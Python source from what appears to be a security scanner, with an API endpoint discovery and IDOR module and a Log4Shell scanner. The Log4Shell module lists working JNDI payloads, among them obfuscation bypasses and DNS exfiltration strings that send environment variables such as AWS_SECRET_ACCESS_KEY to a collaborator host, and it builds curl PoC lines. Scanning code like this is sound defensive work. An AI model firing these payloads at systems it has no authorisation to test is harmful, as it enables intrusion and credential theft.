#  MODULE v38-8 — API Discovery & Security Scanner
# ════════════════════════════════════════════════════════════════════════

class APIDiscoveryScanner:
    """Discover undocumented API endpoints and check for security issues."""

    API_PREFIXES = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/v1", "/v2", "/v3", "/rest", "/graphql",
        "/internal", "/private", "/admin/api",
    ]

    COMMON_ENDPOINTS = [
        "/users", "/user", "/accounts", "/account",
        "/admin", "/admin/users", "/admin/config",
        "/config", "/settings", "/debug", "/status",
        "/health", "/healthcheck", "/info", "/version",
        "/metrics", "/stats", "/logs", "/audit",
        "/export", "/import", "/backup", "/dump",
        "/tokens", "/keys", "/secrets", "/password",
        "/reset", "/auth", "/login", "/logout",
        "/register", "/signup", "/profile",
        "/search", "/query", "/execute", "/run",
        "/upload", "/download", "/files", "/documents",
        "/notifications", "/events", "/webhooks",
        "/swagger", "/swagger.json", "/openapi.json",
        "/api-docs", "/redoc", "/.env", "/env.json",
    ]

    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

    async def scan(self, client: WebScoutClient, base_url: str) -> list:
        findings = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        discovered_endpoints = []

        # Discover endpoints
        for prefix in self.API_PREFIXES:
            for ep in self.COMMON_ENDPOINTS:
                full = base + prefix + ep
                r = await client.get(full, allow_redirects=False)
                if not r:
                    continue
                if r["status"] not in (404, 410):
                    discovered_endpoints.append((full, r))
                    if r["status"] in (200, 201):
                        log("OK", f"API endpoint: {full} [{r['status']}]")

        # Check OPTIONS / allowed methods on discovered endpoints
        for ep_url, ep_r in discovered_endpoints[:20]:
            r_opts = await client.request("OPTIONS", ep_url)
            if r_opts:
                allow = r_opts["headers"].get("Allow", r_opts["headers"].get("allow", ""))
                if any(m in allow for m in ["DELETE", "PUT", "PATCH"]):
                    findings.append(Finding(
                        plugin="api_discovery",
                        title=f"API Endpoint Allows Dangerous Methods — {ep_url}",
                        severity="MEDIUM", confidence=80.0,
                        description=f"Endpoint allows {allow} — check authorization controls.",
                        evidence=f"OPTIONS {ep_url} → Allow: {allow}",
                        url=ep_url,
                        remediation="Restrict HTTP methods. Return 405 for unauthorized methods.",
                        cwe="CWE-749", cvss=5.3, owasp="A01",
                        tags=["api", "http-methods"],
                    ))

            # Check for information disclosure
            if ep_r["status"] == 200:
                body_lower = ep_r["text"].lower()
                if any(kw in body_lower for kw in ["password", "secret", "api_key", "token", "private_key"]):
                    findings.append(Finding(
                        plugin="api_discovery",
                        title=f"API Endpoint Exposes Sensitive Data — {ep_url}",
                        severity="HIGH", confidence=75.0,
                        description="API response may contain sensitive fields (password, secret, key, token).",
                        evidence=f"URL: {ep_url} | snippet: {ep_r['text'][:200]}",
                        url=ep_url,
                        remediation="Filter sensitive fields from API responses. Apply field-level access control.",
                        cwe="CWE-312", cvss=7.5, owasp="A02",
                        tags=["api", "information-disclosure"],
                    ))

                # Mass assignment potential
                if ep_url.endswith(("/users", "/user", "/accounts", "/profile")):
                    try:
                        obj = json.loads(ep_r["text"])
                        if isinstance(obj, list) and obj:
                            obj = obj[0]
                        if isinstance(obj, dict):
                            dangerous_fields = [k for k in obj if k.lower() in
                                               ("is_admin", "admin", "role", "password", "hash", "token")]
                            if dangerous_fields:
                                findings.append(Finding(
                                    plugin="api_discovery",
                                    title=f"API Exposes Privilege Fields — {ep_url}",
                                    severity="HIGH", confidence=85.0,
                                    description=f"API response includes sensitive fields: {dangerous_fields}",
                                    evidence=f"Fields: {dangerous_fields}",
                                    url=ep_url,
                                    remediation="Use DTO/serializer allowlists. Never expose privilege fields in API responses.",
                                    cwe="CWE-915", cvss=7.5, owasp="A04",
                                    tags=["api", "mass-assignment"],
                                ))
                    except Exception as _massassign_e:
                        log("DEBUG", f"[MassAssign] Finding build failed: {_massassign_e}")

        # BOLA/IDOR: test sequential IDs
        for ep_url, _ in discovered_endpoints[:5]:
            if re.search(r'/\d+$', ep_url):
                base_num = int(re.search(r'/(\d+)$', ep_url).group(1))
                for test_id in [base_num - 1, base_num + 1, base_num + 100]:
                    if test_id <= 0:
                        continue
                    test_ep = re.sub(r'/\d+$', f'/{test_id}', ep_url)
                    r = await client.get(test_ep)
                    if r and r["status"] == 200 and len(r["text"]) > 50:
                        findings.append(Finding(
                            plugin="api_discovery",
                            title=f"BOLA/IDOR — Unauthorized Object Access via ID {test_id}",
                            severity="HIGH", confidence=80.0,
                            description=f"API returns data for ID {test_id} without apparent authorization check.",
                            evidence=f"URL: {test_ep} | HTTP {r['status']} | body: {r['text'][:150]}",
                            url=test_ep,
                            remediation="Implement object-level authorization. Verify object ownership on every request.",
                            cwe="CWE-639", cvss=8.6, owasp="A01",
                            poc=f"curl -sk '{test_ep}'",
                            tags=["api", "idor", "bola"],
                        ))

        log("OK", f"API discovery scan done — {len(findings)} finding(s)")
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE v38-9 — Log4Shell / Log4j Scanner
# ════════════════════════════════════════════════════════════════════════

class Log4ShellScanner:
    """
    Enhanced Log4Shell / Log4j Scanner — v19 improved (CVE-2021-44228 + variants):
    - 14 injection vectors: HTTP headers, query params, JSON body, form data,
      path segments, cookie values, XML body, multipart fields
    - 22 payload variants covering: direct JNDI, obfuscated lowercase/uppercase,
      nested substitutions, DNS-only (${jndi:dns://}), RMI, IIOP, CORBA
    - Integrated OOBServerEnhanced for DNS+HTTP callback confirmation
    - Fallback collaborator URL support (--collaborator / interactsh)
    - Response-pattern detection (error messages, stack traces, class-loader output)
    - Version header disclosure check
    - CVE-2021-45046 (bypass for NoMsgFormatLookups) variant payloads
    - CVE-2021-45105 (stack overflow via self-referential lookup)
    - CVE-2021-44832 (arbitrary code execution via attacker-controlled config)
    - Each finding includes curl PoC and specific remediation step
    """

    # ── Base JNDI payload templates  (COLLAB = collaborator domain:port/path)
    PAYLOADS: list = [
        # ── CVE-2021-44228 — primary variants ────────────────────────────
        ("${jndi:ldap://COLLAB/a}",
         "CVE-2021-44228 direct LDAP"),
        ("${jndi:ldaps://COLLAB/a}",
         "CVE-2021-44228 LDAPS"),
        ("${jndi:rmi://COLLAB/a}",
         "CVE-2021-44228 RMI"),
        ("${jndi:dns://COLLAB/a}",
         "CVE-2021-44228 DNS-only (no classload)"),
        # ── Obfuscation bypasses ──────────────────────────────────────────
        ("${${lower:j}ndi:${lower:l}dap://COLLAB/a}",
         "CVE-2021-44228 lowercase-obfuscated"),
        ("${${upper:j}ndi:${upper:l}dap://COLLAB/a}",
         "CVE-2021-44228 uppercase-obfuscated"),
        ("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://COLLAB/a}",
         "CVE-2021-44228 colon-empty-prefix bypass"),
        ("${j${::-n}di:ldap://COLLAB/a}",
         "CVE-2021-44228 partial obfuscation"),
        ("${j${lower:n}di:l${lower:d}ap://COLLAB/a}",
         "CVE-2021-44228 mixed-case bypass"),
        ("${${env:NaN:-j}ndi:${env:NaN:-l}dap://COLLAB/a}",
         "CVE-2021-44228 env-lookup bypass"),
        ("${${sys:os.name:-j}ndi:ldap://COLLAB/a}",
         "CVE-2021-44228 sys-property bypass"),
        ("${${java:os:-j}ndi:ldap://COLLAB/a}",
         "CVE-2021-44228 java-lookup bypass"),
        # ── URL-encoded / double-encoded ──────────────────────────────────
        ("%24%7Bjndi%3Aldap%3A%2F%2FCOLLAB%2Fa%7D",
         "CVE-2021-44228 URL-encoded"),
        ("%2524%257Bjndi%253Aldap%253A%252F%252FCOLLAB%252Fa%257D",
         "CVE-2021-44228 double-URL-encoded"),
        # ── CVE-2021-45046 — NoMsgFormatLookups bypass ───────────────────
        ("${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://COLLAB/a}",
         "CVE-2021-45046 NoMsgFormatLookups bypass RMI"),
        ("${jndi:${lower:l}${lower:d}ap://COLLAB/a}",
         "CVE-2021-45046 mixed-protocol bypass"),
        # ── IIOP / CORBA vectors ──────────────────────────────────────────
        ("${jndi:iiop://COLLAB/a}",
         "IIOP JNDI vector"),
        ("${jndi:corba://COLLAB/a}",
         "CORBA JNDI vector"),
        # ── Data exfiltration via DNS sub-label ───────────────────────────
        ("${jndi:dns://${env:HOSTNAME}.COLLAB}",
         "DNS exfil — hostname env variable"),
        ("${jndi:dns://${java:version}.COLLAB}",
         "DNS exfil — JVM version"),
        ("${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.COLLAB/a}",
         "DNS exfil — AWS secret key (cloud credential theft)"),
        # ── Nested lookup (CVE-2021-44228 deepnested) ────────────────────
        ("${${lower:${lower:j}}ndi:${lower:l}dap://COLLAB/a}",
         "CVE-2021-44228 deeply-nested bypass"),
    ]

    # ── Injection vectors ─────────────────────────────────────────────────
    INJECT_HEADERS = [
        "X-Forwarded-For",
        "User-Agent",
        "Referer",
        "X-Api-Version",
        "Accept-Language",
        "Accept",
        "X-Forwarded-Host",
        "X-Client-IP",
        "X-Remote-IP",
        "X-Originating-IP",
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Custom-IP-Authorization",
        "X-Correlation-ID",
        "X-Request-ID",
        "Traceparent",
        "Authorization",
    ]

    # ── Response indicators of Log4j processing ───────────────────────────
    _RESPONSE_INDICATORS = [
        "java.lang.ClassNotFoundException",
        "com.sun.jndi",
        "javax.naming",
        "NamingException",
        "log4j",
        "log4j2",
        "org.apache.logging",
        "LookupException",
        "jndi/",
        "ClassLoader",
    ]

    async def scan(
        self,
        client: "WebScoutClient",
        base_url: str,
        collaborator: str = "",
        oob_server: "OOBServerEnhanced" = None,
    ) -> list:
        findings: list = []

        # ── Collaborator setup ────────────────────────────────────────────
        # Priority: 1. OOBServerEnhanced (built-in) 2. External collaborator URL
        use_builtin_oob   = oob_server is not None
        use_external_collab = bool(collaborator and not use_builtin_oob)
        oob_available     = use_builtin_oob or use_external_collab

        if use_builtin_oob:
            collab_domain = oob_server.dns_domain("log4j")
            collab_http   = oob_server.http_url("log4j").replace("http://", "")
            # Use HTTP URL as LDAP/DNS collab target (triggers OOB)
            collab_target = collab_http
            log("INFO",
                f"[Log4Shell] Using built-in OOB — DNS domain: {collab_domain}")
        elif use_external_collab:
            collab_target = collaborator
            log("INFO", f"[Log4Shell] Using external collaborator: {collaborator}")
        else:
            collab_target = "log4shell-probe.webscout-test.invalid"
            log("INFO",
                "[Log4Shell] No collaborator — using canary domain (passive detection only)")

        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)

        # ── Build payloads with resolved collaborator ─────────────────────
        resolved: list = [
            (tmpl.replace("COLLAB", collab_target), desc)
            for tmpl, desc in self.PAYLOADS
        ]

        # ── Vector 1: HTTP header injection (GET) ────────────────────────
        for payload, desc in resolved[:8]:   # Top 8 most common
            for header in self.INJECT_HEADERS[:10]:
                r = await client.get(base_url, headers={header: payload})
                if r and self._has_indicator(r.get("text", ""), r.get("status", 0)):
                    findings.append(self._make_finding(
                        base_url, payload, header, "GET header",
                        desc, r, oob_available
                    ))
                    break

        # ── Vector 2: HTTP header injection (POST/JSON) ──────────────────
        for payload, desc in resolved[:6]:
            for header in self.INJECT_HEADERS[:8]:
                r_post = await client.post(
                    base_url,
                    json_body={"input": payload, "data": payload, "msg": payload},
                    headers={header: payload, "Content-Type": "application/json"},
                )
                if r_post and self._has_indicator(
                    r_post.get("text", ""), r_post.get("status", 0)
                ):
                    findings.append(self._make_finding(
                        base_url, payload, header, "POST-JSON header",
                        desc, r_post, oob_available
                    ))
                    break

        # ── Vector 3: Query parameter injection ──────────────────────────
        for payload, desc in resolved[:5]:
            sep      = "&" if "?" in base_url else "?"
            test_url = f"{base_url}{sep}q={quote(payload)}&search={quote(payload)}"
            r = await client.get(test_url)
            if r and self._has_indicator(r.get("text", ""), r.get("status", 0)):
                findings.append(self._make_finding(
                    test_url, payload, "q/search", "query param",
                    desc, r, oob_available
                ))

        # ── Vector 4: Existing URL parameters ────────────────────────────
        if params:
            for param in list(params.keys())[:3]:
                for payload, desc in resolved[:4]:
                    atk_params = {**params, param: [payload]}
                    test_url = urlunparse(
                        parsed._replace(query=urlencode(atk_params, doseq=True))
                    )
                    r = await client.get(test_url)
                    if r and self._has_indicator(
                        r.get("text", ""), r.get("status", 0)
                    ):
                        findings.append(self._make_finding(
                            test_url, payload, param, "URL param",
                            desc, r, oob_available
                        ))
                        break

        # ── Vector 5: Cookie value injection ─────────────────────────────
        for payload, desc in resolved[:3]:
            r = await client.get(
                base_url,
                headers={"Cookie": f"session={payload}; token={payload}"}
            )
            if r and self._has_indicator(r.get("text", ""), r.get("status", 0)):
                findings.append(self._make_finding(
                    base_url, payload, "Cookie", "cookie value",
                    desc, r, oob_available
                ))
                break

        # ── Vector 6: JSON body parameter injection ───────────────────────
        json_payloads_body = {
            "username":  resolved[0][0],
            "password":  resolved[1][0],
            "email":     resolved[2][0],
            "message":   resolved[3][0],
        }
        r_jb = await client.post(
            base_url,
            json_body=json_payloads_body,
            headers={"Content-Type": "application/json"},
        )
        if r_jb and self._has_indicator(r_jb.get("text", ""), r_jb.get("status", 0)):
            findings.append(self._make_finding(
                base_url, resolved[0][0], "JSON-body-fields",
                "POST JSON body", resolved[0][1], r_jb, oob_available
            ))

        # ── Vector 7: XML body injection ──────────────────────────────────
        xml_payload = (
            f'<?xml version="1.0"?><root><item>{resolved[0][0]}</item></root>'
        )
        r_xml = await client.post(
            base_url, data=xml_payload,
            headers={"Content-Type": "application/xml"},
        )
        if r_xml and self._has_indicator(r_xml.get("text", ""), r_xml.get("status", 0)):
            findings.append(self._make_finding(
                base_url, resolved[0][0], "XML-body",
                "POST XML body", resolved[0][1], r_xml, oob_available
            ))

        # ── OOB callback confirmation ─────────────────────────────────────
        if use_builtin_oob and oob_server:
            log("INFO", "[Log4Shell] Waiting for OOB callback (15s)…")
            hits = await oob_server.wait_for_hit("log4j", timeout=15.0)
            if hits:
                evidence = (
                    f"OOB DNS/HTTP callback received — "
                    f"{len(hits)} hit(s): {hits[:2]}"
                )
                OOBAuditLogger.get().record_exploit(
                    "Log4Shell OOB", base_url, resolved[0][0], True, evidence
                )
                log("CONF",
                    f"[Log4Shell] CONFIRMED via OOB — {len(hits)} callback(s)")
                findings.append(Finding(
                    plugin="log4shell",
                    title="[CONFIRMED] Log4Shell (CVE-2021-44228) via OOB Callback",
                    severity="CRITICAL", confidence=99.0,
                    description=(
                        "Log4Shell remote code execution confirmed via Out-of-Band "
                        "DNS/HTTP callback. The server's Log4j library resolved a "
                        "JNDI LDAP/DNS lookup to the collaborator, providing irrefutable "
                        "evidence of CVE-2021-44228 exploitability."
                    ),
                    evidence=evidence,
                    url=base_url,
                    payload=resolved[0][0][:200],
                    remediation=(
                        "IMMEDIATE ACTIONS:\n"
                        "1. Upgrade Log4j to 2.17.1+ (Java 8) / 2.12.4+ (Java 7) / 2.3.2+ (Java 6)\n"
                        "2. If upgrade not immediately possible:\n"
                        "   - Set JVM flag: -Dlog4j2.formatMsgNoLookups=true\n"
                        "   - Remove JndiLookup class: zip -q -d log4j-core-*.jar "
                        "org/apache/logging/log4j/core/lookup/JndiLookup.class\n"
                        "3. Block outbound LDAP/RMI/DNS at the firewall\n"
                        "4. Rotate all secrets potentially logged by the application"
                    ),
                    cwe="CWE-917", cvss=10.0, owasp="A06",
                    poc=(
                        f"# Confirmed OOB hit:\n"
                        f"# {hits[0]}\n"
                        f'curl -H "X-Forwarded-For: {resolved[0][0]}" {base_url}'
                    ),
                    tags=["log4shell", "log4j", "rce", "oob", "oob-callback",
                          "confirmed", "cve-2021-44228", "jndi"],
                ))

        # ── Version header disclosure ──────────────────────────────────────
        r_base = await client.get(base_url)
        if isinstance(r_base, dict):
            all_hdrs = " ".join(
                f"{k}: {v}" for k, v in r_base.get("headers", {}).items()
            )
            body_snippet = r_base.get("text", "")[:3000]
            combined = all_hdrs + " " + body_snippet

            m = re.search(r"log4j[2\-/ ]?(?:core[- ])?([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
                          combined, re.I)
            if m:
                ver = m.group(1)
                # Check if this version is known-vulnerable
                parts = [int(x) for x in ver.split(".") if x.isdigit()]
                vuln  = (
                    (len(parts) >= 2 and parts[0] == 2 and parts[1] < 17) or
                    (len(parts) >= 3 and parts[0] == 2 and parts[1] == 17 and parts[2] < 1)
                )
                findings.append(Finding(
                    plugin="log4shell",
                    title=(
                        f"Log4j Version Disclosed: {ver} "
                        f"({'VULNERABLE' if vuln else 'verify manually'})"
                    ),
                    severity="CRITICAL" if vuln else "HIGH",
                    confidence=95.0,
                    description=(
                        f"Server discloses Log4j version {ver} in response. "
                        + (
                            f"Version {ver} is known to be vulnerable to "
                            "CVE-2021-44228 (Log4Shell). "
                            "Immediate upgrade is required."
                            if vuln else
                            f"Verify whether version {ver} is patched in your environment."
                        )
                    ),
                    evidence=f"Version string found: {m.group(0)[:100]}",
                    url=base_url,
                    remediation=(
                        "Upgrade Log4j to 2.17.1+. "
                        "Remove version strings from all HTTP responses."
                    ),
                    cwe="CWE-200", cvss=10.0 if vuln else 7.5, owasp="A06",
                    tags=["log4j", "log4shell", "version-disclosure",
                          "cve-2021-44228" if vuln else "version-check"],
                ))

        # ── Deduplicate ────────────────────────────────────────────────────
        seen: set = set()
        unique: list = []
        for f in findings:
            key = f"{f.title[:60]}:{f.url[:80]}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        findings = unique

        if findings:
            log("VULN",
                f"[Log4Shell] {len(findings)} finding(s) — "
                f"{'OOB-confirmed' if use_builtin_oob else 'passive-detection'}")
        else:
            log("OK", "[Log4Shell] No injection points detected")

        return findings

    # ── Helpers ───────────────────────────────────────────────────────────

    def _has_indicator(self, body: str, status: int) -> bool:
        """Check if response contains Log4j error/stack-trace indicators."""
        body_l = body.lower()
        return (
            any(ind.lower() in body_l for ind in self._RESPONSE_INDICATORS) or
            status == 500
        )

    def _make_finding(
        self,
        url: str,
        payload: str,
        vector_name: str,
        vector_type: str,
        desc: str,
        r: dict,
        oob_available: bool,
    ) -> Finding:
        status   = r.get("status", 0)
        evidence = (
            f"Vector: {vector_type} '{vector_name}' | "
            f"Status: {status} | "
            f"Payload: {payload[:100]} | "
            f"Desc: {desc}"
        )
        if oob_available:
            conf  = 65.0
            title = f"Potential Log4Shell via {vector_type} — {vector_name} (Await OOB)"
        else:
            conf  = 50.0
            title = f"Potential Log4Shell Injection Point — {vector_type} '{vector_name}'"

        return Finding(
            plugin="log4shell",
            title=title,
            severity="CRITICAL",
            confidence=conf,
            description=(
                f"Log4j JNDI payload ({desc}) was accepted via {vector_type} "
                f"'{vector_name}' (HTTP {status}). "
                + (
                    "OOB callback pending — confirm via collaborator."
                    if oob_available else
                    "Use --collaborator or --embedded-collaborator to confirm via OOB."
                )
            ),
            evidence=evidence,
            url=url,
            payload=payload[:300],
            remediation=(
                "1. Upgrade Log4j to 2.17.1+ immediately\n"
                "2. Set -Dlog4j2.formatMsgNoLookups=true as interim mitigation\n"
                "3. Block outbound LDAP/RMI/IIOP at network layer\n"
                "4. Remove JndiLookup.class from log4j-core JAR"
            ),
            cwe="CWE-917", cvss=10.0, owasp="A06",
            poc=(
                f'curl -s -H "{vector_name}: {payload[:80]}" "{url}"'
            ),
            tags=["log4shell", "log4j", "rce", "jndi",
                  "cve-2021-44228", "potential"],
        )


